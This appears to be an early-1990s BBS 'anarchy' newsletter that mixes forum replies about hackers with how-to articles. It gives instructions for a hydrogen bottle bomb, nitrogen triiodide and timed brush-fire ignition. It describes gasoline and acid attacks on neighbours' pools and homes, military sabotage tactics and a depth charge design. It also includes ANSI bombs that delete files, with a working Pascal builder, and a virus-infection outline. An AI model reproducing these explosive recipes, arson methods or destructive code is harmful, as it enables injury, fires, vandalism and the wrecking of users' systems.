Well, here's there reactions. I hope you get as many laughs as I did.

RE: pirates
By: Ryan XXXXXXXXX


Well, I answer yer questions right here.

#1- Pirates I can put up with, cause almost everybody pirates software, and
there's pretty much no stopping that.  But hackers need to be taken care of!

#2- Theres alot of pirate(Elite) boards in this area, I would like to name a
few but I guess I shouldn't..

#3- Hackers might be able to be taken care of once that call tracing system
comes out sometime this year or the next, that'll be great!  Other that that
theres not many ways of proving what they did, you can always get them
blacklisted from local boards, but they'll always be on the Elite.


So much for this dude, guess he still thinks i'm a PD user. Check out the
second one though. And I used to like this guy....


RE:pirates
By:Chuck XXXXXXX

Most hackers are nerds with no lives who hack because they have alot of
hatred in them because of not being accepted. I know because I used to be
one. There are about 10 in XXX. Most hackers are rich snobs from XX or
XXX :-). Not bother eliminating hacking is just a phase for most people,
unless the hacker is a complete loser. When I say hackers, I talk about
people messing around with credit cards, TRW's, nets, bbs's, etc. Not
programmers who are cool.


I really hate this guy now, because I just happen to go to XX. Didn't really
answer my question though. I say we all gang up and ran on this guy bad.
We'll show him not being accepted. And he used to be a hacker? Anybody ever
hear of him? I think he uses the handle Mookie. Probably a wanna-be-a-hacker.
Didn't say anything about pirates, did he? Maybe he's still a wanna-be-a-
pirate.

If you liked this article, let me know, and you can be sure that there will
be a sequel, or at least another article to this effect.

                            The improved Super soaker.

     Ok.. this is a bit corny, I agree.. but what the hell.. it's summer.

Ok peoples.. i'm sick of getting soaked by those damn waterguns, that hold 2 
gallons of water, and use air pressure to nuke you...  So I developed a REAL 
WEAPON.

What you need..
(1) 5 gallon water tank.
(1) 3ft length of rubber tubing.
(1) Cheap watergun, mini supersoaker works best.
(1) control valve or stopcock.  optional if a mini supersoaker is used.
(1) Air compressor, or bicycle pump.
(1) cheap BICYCLE innertube.

Here's what you do..  Jump in your car, and plug the air compressor into the 
cigarette lighter.  Now, grab your water jug.  Drill a small hole in the 
bottom of the jug.  Now glue the valve from an innertube to this hole.. Make 
SURE it is airtight.  The best way is to push it from the inside of the jug, 
and melt it together.  Now take the rubber tubing and do the same.  Except 
this time, at the top of the jug.  Turn the jug upside down.  Now attach a 
valve to the end of the tubing, and a water gun to the end of that. Attach 
the gun by the fill hole.  Fill the 5 gallon tank.  Start the car, and run 
the compressor.  Find some idiotic fool with a water pistol, and open fire!

This will shoot a TREMENDOUS AMOUNT OF WATER OUT..  At an EXTREME force.  
Don't be surprised if you get 50-100 feet, if not more.  A good idea would be 
to attach a air pressure meter to the jug, to avoid potential destruction by 
running the compressor too long, although, it would make a great grenade!

                              Written by:
                                SiR RoM
                                of FBi!
Materials Needed:
    Hydrochloric Acid (Sold as Muriatic Acid)
    20 Pennies
    Clorox Bottle (Or anything else big w/a screw on cap)
    Matches or a sparkler
    Hacksaw
    5 foot pole


Procedure:
    1)  Obtain the hydrochloric acid from your schools science lab, or buy it
    from ANY hardware store at about $2.89 a gallon.  Lab grade is much better
    seeing as it's about 70% acid, and store bought is only about 39-40% acid.
    If you do happen to have lab grade, you'll only need about half as much.  

    2)  Rinse out the clorox bottle good, then fill it about 1 1/2 - 2 inches
    deep with Lab grade acid, or 3-5 inches deep if you're using store bought
    acid.  Now depending if you want this to be a flamethrower or a bomb,
    drill a hole in the cap.  Make it larger if you want a flamethrower, about
    3/4 to 1 inch, or smaller, about 1/4 to 1/8 of an inch if you want a bomb.
    CAUTION!:  I'd wear gloves when pouring this.  It feel's GREAT when it
    touches your skin!  Oh Yeah, use a funnel.

    3)  Pennies, which are actually 98% zinc, only have a 1/100 millimeter
    thick coating of copper.  Your job is to scrape the copper off, with a 
    hacksaw.  Grab the pennies with a pair of pliers, and spend a few seconds
    scraping away the surface area of each penny.  You don't need to get every 
    little piece od copper off!  

    4)  Go to the spot where you plan to use it.  Attach either a match or a 
    sparkler to the end of the pole/broom/whatever.  Dump all the pennies in
    and quickly cap the bottle.  The zinc in the pennies reacts violently with
    the acid, creating LARGE amounts of hydrogen gas.  Light the sparkler or
    match, then put it over the hole.  If you used a large hole, you'll see a
    HUGE flame shoot 10' into the air.  If you used a small hole, the gas 
    won't be able to escape fast enough, so it explodes.  The whole bottle 
    will blow apart in a big fireball spewing toxic sulfides EVERYWHERE!
    The brown stuff looks like melted chocolate, but I wouldn't eat it 
    kiddies.


    Extra Notes:  Wicks also work, but make sure the wick extends a ways down
into the bottle.  Also, I've never tried a glass bottle, but I'm sure it'd
be a nice touch.

     FBI Presents..  SUMMER!

     Hahhaha!  Welcome to summer boyz and girlies!  We here at FBI are proud 
to present the summer to you.   Not only that. We're ready to begin the fun!  
Yessire...

     S E A S O N A L  A N A R C H Y ! ! !

This is it..  You had fun in spring..  now it's time for summer to work it's 
evil ways..

Brush:  Brush fires are an excellent way to cause terror in the summer.  And 
they are so damn easy to to!  A simple lighter will set a whole damn field 
into flames.  You can EASILY  rig up a time delay too.

  1:  Pour some gasoline into a jar, and drop one of those brown medicine 
bottles, filled with X-tra strength liquid Drano in.  Seal the top, and coat 
the surrounding area with gas.  This WILL work, and will provide about 5-10 
minutes.

  2:  Put a REAL long slow wick, on a cheap INCENDIARY.. This will give you 
as much time as you want.

  3:  Tie a wick to a CIGARETTE.  Light the cigarette, and let it burn down.  
The cig will light the wick..  This will give you about 8-10 minutes, 
depending on the type of cig.  Marlboro works best!  (PLUG!)


Summer School:  If your not in summer school, show up for the first day.  
Tell all the teachers that you ARE supposed to be there, and then don't show 
up for the rest of the year.  It'll just piss the HELL out of them.  And when 
they fail you..  go down to the principals office, and tell him how your 
teachers are delusioned, and you were never enrolled in summer school, 
because you passed during the regular year!  Ruin everyone's day.

Squirt guns: A file in it's own..  But i'll be brief.  Why be nice to that 
geek that drove by in his car and soaked you?  Fill YOUR super soaker up with 
coca cola, and nail his paint job with it.  hahaha! Or get his nice new 
T_shirt with clorox!  Even better, fill yours with BOILING water..  NASTY. Of 
course,  you can ALWAYS fill it with gasoline, and rig up a cheap flame 
thrower.  What the hell, fill a water balloon with gasoline, and nail 
someone.  Then threaten them by pitching matches at them.  Or drop strike 
anywhere match heads all around them, so they are afraid to take a step.
Evil evil evil!

Pools:  Take about 8 gallons of muriatic acid(HCL) and pour it into thier 
pool.  This will simply ruin thier summer.  Or just shock their pool every 
now and then, and don't tell them.  Add tons of baking soda while they're 
away for a few days, their whole pool will be coated with algae.  Pour a 
little gasoline in their pool, and set it on fire.  What are they gonna do?  
pour water on it?  Hahahaha!   Launch a rocket from the bottom of thier pool 
remotely while they are in the backyard.  Ever see a nuclear submarine?  All 
ya gotta do is coat the rocket with tons of dope(not mary jane!) and use an 
electric igniter.  WHOOSH!  Plug up all the drain holes, and flood thier pool 
with a garden hose, or wait for a nasty rain storm.  Shit in thier pool every 
so often.  Buy 20 vials of Yellow food coloring, and turn thier pool yellow.
If they have an above ground pool, siphon the pool out into a neigbor's lawn.  
Kills ALL the grass, and starts a tremendous fued.  Imagine all that water, 
on your lawn!  Weaken the supports on an above ground pool.  The pool will 
explode in a week or two.  Dump about 6 bags of sand in thier pool... just 
IMAGINE trying to get it all off the bottom.  Fill thier pool toys with 
NAPHTHA, so when it gets hot, the toy blows up!  Fill up a pool with vinegar.


Lawns: Cover a lawn with charcoal.  Make a checkerboard on their lawn with 
gasoline.  All it does is kill the grass.  Coat a lawn with manure, it will 
smell up the WHOLE neighborhood, and piss off all thier neighbors.  Put 
roadkill all over their lawn.  Or better yet hide it and smell up the area. 
Rototill the whole lawn.  Make sure they are away first!  Bury steaks and 
dogfood in their lawn..  "Honey, why are there 40 dogs on our front yard?" 
set thier automatic sprinklers to go off at wierd hours,  or rig up a remote 
control.  Soak some dude while he mows his lawn.  Put airplane fuel in his 
lawn mower. VROOOMMM!!

Homes:  Throw an egg at thier window, and it will BAKE on.  Stick a hose thru
a window, and flood it.  Replace scrrens with storm windows.  Turn the heat 
all the way up while they're away!  Get a huge pot, and fill it with popcorn 
kernals,  set it on the stove, and fill thier house with it. Glue thier grill 
shut.  Or glue the burner knob open.  Empty thier propane tank on thier lawn, 
the whole lawn will fog up.

These are just a FEW of the dastardly things one can do to annoy those around 
him.  I think I'm gonna egg my neigbor..  Either way, use these, or invent 
your own..  most of all HAVE FUN!

                        CHEMISTRY CORNER!

Yes, once again, I Garbled User, bring to you, a completely looneytoons idea.  
once again, please take out a neigbor with this one.

              Nitrogen Tri-iodide.

Yes, it's been done.  Overdone I might add.  Everyone and thier DOG has 
wriiten a file on how to make this stuff.  Yet, In all the files I've ever 
read.  NOT ONE, not even ONE stupid idiot has ever gotten it right. I allways 
hear, ammonia crystals, iodine crystals.  All kinds of INCORRECT information.  
How is one supposed to safely make an explosive, when no two files give 
collaborating evidence?  Well..  I'll put this to you at POINT BLANK RANGE.  
This IS the correct method.  THIS IS the correct formula, and this IS the 
correct name!  What do you want me to do?  Throw some at you?


First how to make the stuff, as if you don't know.

1. Add either 10g of solid iodine, or 4 oz. of tincture of iodine to about 1 
cup of ammonia water.  The clear stuff.  NO SUDS!

2. Shake like a muthafucka for about 7 minutes.

3.  Now Filter the suspension through 2, not one, 2 mista coffee filtas!

4.  Repeat this, over, and over, and over, using the same filter, until a 
lightly colored green fluid is left.  Throw this fluid on a plant, for it is 
a deadly biotoxin!

5.  Now allow these crytals to dry, and stomp on them or something.

Now, this is all fine and dandy..  here's the technical stuff.

"Concentated Aqueous ammonia reacts with I2 at 23C to give black, explosive 
crystals of (NI3*NH3)n that contains zigzag chains of NI4 tetrahedra sharing 
corners, with NH3 molecules lying between the chains and linking them 
together; NI3*3NH3 is similar."
  Advanced inorganic Chemistry 1985.

What does this mean?  This means that ammonia is trapped within the linking 
chains of Nitrogen tri-iodide, thus giving it it's explosive properties.

And yes, look it up, it IS nitrogen triiodide.  Basic formula NI3.

Good, now go kill someone.

OK..  this is useless to all you puny, wanna-be-anarchists.
This.. is for the REAL MEN/weomen?

This file.. is for you revolutionaries out there.  This file will not explain 
the explosives, or how they are used.  It will explain tactics to do the 
following.

Stop an armored unit in a forest.
Mine a desert.
Take over a city.
Blow up a tank.
Take out planes.
Blow up boats.
Flood submarines.

Next month. I'll have even MORE..


Chapter I : Armor units.

Ok.  A unit of tanks, or armored vehicles are moving through a forest to 
attack.  How do you take them out?

First.  Any large vehicle like that, will travel on a flat road to go faster, 
and be quieter.  This is easily used to your advantage.  The armor unit will 
have to be stalled signifigantly.  One simple way is to take out a bridge.  
This however is only partly useful, and only if there is a bridge to destroy.  
A better way, is to mine a path.  The first tank will hit the mine, and stop 
the other tanks.  The rubble will take a long time to clear.  One could 
easily do this.  Find two HUGE trees on opposite sides of a road.  Take these 
trees, and cut them 10 feet below the midpoint of the tree.  Cut them 
halfway, so they fall into the road.  They MUST NOT BREAK AWAY FROM THE 
BRANCH.  This will create a huge barrier on the road.. that troops must climb 
the tree to remove.  Large pits filled with quicksand, or covered with a fake 
top willbring a tank down QUITE fast.  The absolute best, 100 percent sure, 
method of taking out an armor column, is to use naplam.  LOTS of naplam.  
Pour it on trees, and paths.  Pour it everywhere.  Light it, and you will 
start a VERY big forest fire.  If the wind is going in the direction of the 
oncoming tanks..  rest assured that they cannot outrun the fire.

Chapter II : Mining the desert.

This is dificult.  An oncoming advancement take go ANYWHERE in the desert. 
One would wish to spread his mines out over a long area.  Example.  You are 
defending a city.  The attackers are coming from the north.  Using heat 
mines, or detonation mines, mine the entire northern hemisphere around the 
city.  In a huge half circle.  Bury your mines DEEP in the earth.  The best 
way to build them is to use wood.  Why?  A mine detecter doesn't pick up the 
mine, it picks up the metal casing.  HMMMMM?  Or best of all, use remote 
controls to detonate them.

Chapter III: Storming a city.

A city is difficult to aquire.  So one must do it by strategy.  NOT brute 
force.  First, send special troops in, to take out important things.  Example 
dams must be destroyed.  All bridges, and main roads should be taken out.  
Power companies, and phone companies or lines should be destroyed.  All power 
stations/generators should be blown up.  Any enforcement buildings such as 
courthouses, police stations, or town halls should be obliterated.  All large 
meeting areas should be destroyed to avoid any organized resistance.  Slowly 
build forces from within, and declare yourself leader.  Small fragmented 
bursts of resistance will occur, but with everything taken out.. they will 
fall quickly.  One more thing.. Take over ANY AND ALL tv or radio stations.  
This way you can broadcast your demands to the city.

Chapter IV: Blow up a tank.

This is easy.  A tank's lightest armor is on the underside.  This is a great 
place to hit it with a BIG bomb.  Taking an explosive, and blowing a tread 
off will also severely cripple a tank.  An explosive placed in the joint of 
the turret could blast the turret off with some luck.  Napalming a tank will 
kill anyone inside the tank.  The heat from the fire will roast them alive.  
Placing a tank shell inside the barrel of the gun pointing towards the tank, 
will cause it to explode when a shell is fired.  And best of all, a large 
thermite incindiary will melt through the armor on top of the turet with 
ease.  Or a simple grenade in an open hutch works well too.

Chapter V: Take out a plane.

Ok.  A Plane is flying over your unit straffing your people to shreds. What 
do you do?  A simple rocket tube will take it out..  but with minimum 
effectiveness.  Here's how you take a plane out FAST.
Grab a cannon shell.  Cut the end off.  So the case, and a small flat shell 
remain.  Like a lead wafer.  Now load this shell into a cannon.  Find about a 
bucket full of pebbles at least one inch in size.  Pour these into the 
cannon.  When the plane comes overhead.  Fire the cannon.  It WILL go down.  
It WILL explode.  The pilot WILL die.  For an extra nasty effect.  Just pour 
napalm into the cannon.  It will shower the sky will flames when shot.

Chapter VI: Boat Destruction.

One method of taking out an attacking boat, is to naplam the water around 
your shoreline.  When a boat attacks, grenade the water, setting the whole 
thing on fire.   Set up flotation devices with wire between them. When a boat 
passes over the wire, it will become entangled in the wire.  Cutting this 
wire and attching the grenade to the wire, and the pin to the floatation 
device, will cause the pin to be removed when a boat catches the wire.  The 
wire would wrap around the prop, and explode.  Turning the boat to mud.  
Sodium metal, when dropped in water, can be used to destroy a boat.  Should 
the boat encounter the metal flying around the water, and one of the guns 
were to fire, the entire boat would be engulfed in a huge fuel air explosion.

Chapter VII: Flood a submarine.

One of the best methods is to take a large amount of phosphorus and to throw 
it over the edge of your boat.  The phosphorus will ignite upon contact with 
the air, and will burn even under water.  If it should hit a submarine, the 
sub's hull will MELT.  Trust me.. they will sink FAST.
Depth charges:

     Gunner-=>
ok...everyone knows that a stick of phosporus ignites when exposed to the 
air.  Well...take a plastic barrel fill it 3/4 full of tnt (or whatever) and 
leave a 1/2" space in diameter empty as long as a test tube.  You will need to create a 
vacuum tube to contain the phosporus.  A metal plate is connected to the 
vacuum tube with the phopsorus on the side of the depth charge that is not 
containing tnt facing tward your explosive.  Annother metal plate is placed 
an inch away from the end of the tube (not connected to the tube)  The first 
metal plate connected t0o the tube should be able to slide a short distance 
(about an inch? Hmmm)  Now lave a small space perhaps a foot and a half long 
empty and make a breakable seal on the outside of the barrel parallel to the 
empty space I just explained.  When the barrel reaches the depth at which the 
water pressure breaks the seal the water will rush in sliding the 1st metal 
plate forward into the tnt and breaking the tube exposing the phosporus to 
the air inside the barrel and igniting it in the tnt.  BOOM! Phun!

Another method, is to do this.  Use a large metal cylindar filled with air, 
capped at one end, and a sheet of rubber stretched over the top.  On the 
bottom of this rubber seal, place one electrode.  Place another electrode so 
that when you press down on the seal, it will touch the two electrodes.  
Build an electronic detonator for the explosive that you have in the 
cylinder.  When the water pressure becomes greater, it will press down on the 
rubber seal, and connect the two electrodes.  Boom.  one sunk sub comin up.


This file is one of many.  If you have any ideas, or would like to white one 
completely..  Send it my way.  I'll gladly print it.  Good luck, and happy 
revolution.

                        PATHOGEN PROGRAMING III

ADVANCED ANSI BOMB PROGRAMMING.

Chapter 1 :  How to crash a BBS.

  This is a particularly EVIL method of taking out a BBS.  There are two 
simple ways to do it however.  METHOD ONE.

Pkunzip allows the use of ANSI in it's zip comments.  Many boards use a zip 
checker to test zipfile integrity.  Using this.. you can take a BBS out.

Upload a file, containg an ansi bomb as the zip comment.  The ansi bomb 
should make a change in the function keys.  Example: say a BBS uses the F9 
key to pull someone into chat.  The bbs also uses the F1 key to give 
temporary sysop access.  Create a redirection to make the f9 key perform the 
actions of the F1 key.  Make the hangup key do something stupid.

What to do:  You upload the file.  The zip checker reads the zipfile, and 
displays the ansi.  PKUNZIP will not interpret the ansi, but the bbs WILL!  
Now ask the sysop to chat.  WORK FAST.  Wipe something out before he figures 
out what happened.  The only BBS this has been tested on was an old WWIV and 
TELEGARD.  The sysop had no idea what happened for about 3 minutes.

Chapter 2:  The ANSI virus.

  This one is FUN FUN FUN!  Create two bombs.  One that redirects a key to do 
the following:
copy PARTII.BOM + *.ans *.ans
The part II is simply the redirection code in a small file with no extra 
junk.  The redirection will add this code to all ansi pictures the bomb 
happens to find.  One could hide this by placing a CTTY NUL at the beginning 
and a CTTY CON at the end.  A nasty bit could potentially be added as well.

Example:
@ECHO OFF
CTTY NUL
copy PARTII.BOM +*.ans *.ans
del *.exe
del *.com
CTTY CON

This will add your ansi code to all the ansi pictures, then it will kill all 
the exe and com files.

Your files should be:
PARTI
neet ansi picture, nasty bit.
PARTII
nasty bit.

Chapter 3 :  ANSIBULD.PAS

This program will allow you to build ansi bombs easily.

Program buildbomb;
uses dos,crt;
var
input1 : char;
input2 : string[255];
f : text;
i : longint;

begin
  Writeln('FBI''s Easy, simple ansi bomb builder.');
  Writeln('What key would you like to redirect? Hit the key now.');
  input1:= readkey;
  if input1 <> #0 then begin
     Writeln('You cannot redefine that key!');
     halt(1);
  end
  else input1:=readkey;
  i := ord(input1);
  Writeln('What do you want the key to do?');
  write(':');
  readln(input2);
  Write('Hold on generating ansi codes..');
  assign(f,paramstr(1));
  rewrite(f);
  write(f, #27+'[0;',i,';27;"'+input2+'";13p');
  close(f);
  Writeln('DONE!  Your bomb is complete.');
end.

That's all folks.  Just complie this sucka with Turbo Pascal 6.0  And have 
fun.  It generates your bomb sequences for you. Now...
copy bomb.ans + picture.ans ansibomb.ans

There you go!

That's all for ANSI.  Number IV will be on virii.

                           PATHOGEN PROGRAMMING IV

  This month we will take a quick look at virii.  How they work, what they 
do.. And just some basics on how to build them!

Chapter 1 : What IS a virus.

   Everyone THINKS they know what a virus is.  A program that kills my 
computer.  This is not the case.  A virus is a program that floats all over 
hell, bouncing from system to system.  I will explain.

     Joe the user runs a virus.  What happens in his machine?
First the virus takes over.  It loads itself into memory.  Now Joey knows 
nothing.  The virus sits there.  Joe runs his favorite game.  The virus 
infects the game by placing it's code deep within the startup code of the 
program.  Now Joey gives this game to his best friend.  His freind uploads it 
to a BBS.  Now everyone who downloads and runs the program has the virus.

THAT is a virus.  This particular virus could just be an annoying little 
mesage that pops up, or could completely wipe your system at any given time!

Chapter 2 : How to build a virus.

    This is just theoretical.. In part I, no actual code will be given.

First, build the nasty bit.  This can be anything.  You could re-arrange the 
fat tables, you can make a certain message pop up if you are running a cheap 
computer.. or whatever.   This is not as hard as it seems.  You can get a 
list of hardware and software interrupts from any local PD bbs.  The list is 
about a MEG long!  This gives you interrupts that can take advantage of 
networking software, special CPU types, and graphics modes!

Now, you must create a way to load the virii into memory.  Many languages 
have a built in procedure to do this.  Such as Pascal's KEEP procedure.  This 
is not to hard, and many PD boards have source available to do this for you.

Now the hard part.  One must manuver the virus code into the file you wish to 
infect.  When loading into memory, load the whole thing in.  Now slap this in 
exactly 25 bytes after the begining of the file to infect.  You've just hit 
home.  The file is now infected.

NEXT MONTH:
PART V :  Actual source examples.  How to build the infection code, and how 
to test your virus.

PART VI:  How to build a self changing virus.  I will tell you how to make a 
virus that will mutate itself to avoid detection.

Also.. If you have an article for us.. MAIL it to us at these addresses!! We'll 
be SURE to get it.. and will be damn proud to put it in.


     Unfortunately.. we have a few rules concerning articles submitted to us.

1) No disclaimer is nessecary, as a general disclaimer will be put at the end 
of each newsletter! Putting a disclaimer in will just cause unneeded hassle for our poor editors.

2) In anarchy and Chemistry articles, all measurements must be in the following units.. or your article may not be accepted!
Temperature - CELCIUS!!
Distance    - Meter(metric)
Volume      - Liter(metric)
Mass        - Gram(Metric)
Please help us keep a standard in our newsletters by conforming to these 
standards.. If you wrote the file in english system originaly, please take the 
time to convert..

3) Please submit only original articles, written by yourself(or copied from a 
book by you). Please do not submit articles that you also submitted to 12 
different newsletters.  If you send it to us, and follow these guidelines, it 
WILL be accepted.

4) Try to keep all Headers and credits to about 5 lines at the beginning and 
the end of the files.. This will keep our little publication neat for any of 
you readers.


     Also.. If you would like a subscription to our publication.. Simply send 
us a message saying so. We are non profit, and therefore we will mail a 
printed copy of the newsletter out(prior to national release, so YOU are one 
of the first to get the issue!) postage due. This may sound like we are 
cheap, but this way nobody gets cheated, and we get to remain anonymous.  
Also.. we need your address to send you mail.. :)
Or an internet subscription is available, just mail me.

Our mag can be grabbed at any of the following places.

NO CARRIER BBS


  F B I   Thanks you for your support.. and we hope to bring you more quality 
literature in the future.
